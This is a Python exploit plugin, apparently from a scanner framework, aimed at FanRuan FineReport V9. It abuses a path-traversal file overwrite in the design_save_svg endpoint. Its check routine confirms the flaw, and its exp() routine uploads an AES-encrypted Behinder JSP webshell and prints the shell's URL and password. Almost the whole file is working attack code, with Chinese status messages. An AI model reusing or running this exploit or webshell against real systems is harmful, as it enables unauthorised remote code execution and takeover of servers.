#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from time import time
from json import dumps
import urllib, random, string
def msg():
  ret = {}
  ret['links'] = ''
  ret['huixian'] = '该脚本存在exp函数，可上传webshell'
  ret['method'] = 'post'
  ret['bugname'] = "帆软V9任意文件覆盖上传"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type':'text/xml;charset=UTF-8'
    }
  randnum=str(time()).split('.')[1]
  data={"__CONTENT__":randnum,"__CHARSET__":"UTF-8"}
  target1 = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp'
  url1 = url + target1
  target2 = '/WebReport/a.svg.jsp'
  url2 = url + target2
  ret['url'] = url2
  try:
    res=requests.post(url=url1,headers=headers,data=dumps(data),timeout=5,verify=False)
    res.close()
  except:
    return ret
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if randnum in resp.text:
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret
def exp(url):
  shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
  payload = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp'
  timeout = 20
  headers = {
    'User-Agent': 'Mozilla/5.0 (compatible, MSIE 9.0, Windows NT 6.1, Trident/5.0)',
    'Content-Type': 'text/xml;charset=UTF-8',
    }
  vurl = urllib.parse.urljoin(url, payload)
  data = {
    "__CONTENT__": shell,
    "__CHARSET__": "UTF-8",
    }
  webshell = urllib.parse.urljoin(url, '/WebReport/update.jsp')
  print('[+] Exploit loading ......')
  time.sleep(3)
  try:
    print('[+] 尝试上传冰蝎webshell ')
    rep = requests.post(vurl, headers=headers, timeout=timeout, json=data, verify=False)
    print('[+] 上传完毕，正在检测webshel是否成功?')
    if rep.status_code == 200:
      rep2 = requests.get(webshell, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
      if rep2.status_code == 200:
        print('[*] status_code: 200 , 上传成功!')
        print('[*] webshell(冰蝎):', webshell)
        print('[*] 密码: rebeyond')
        return True
    return False
  except:
    return False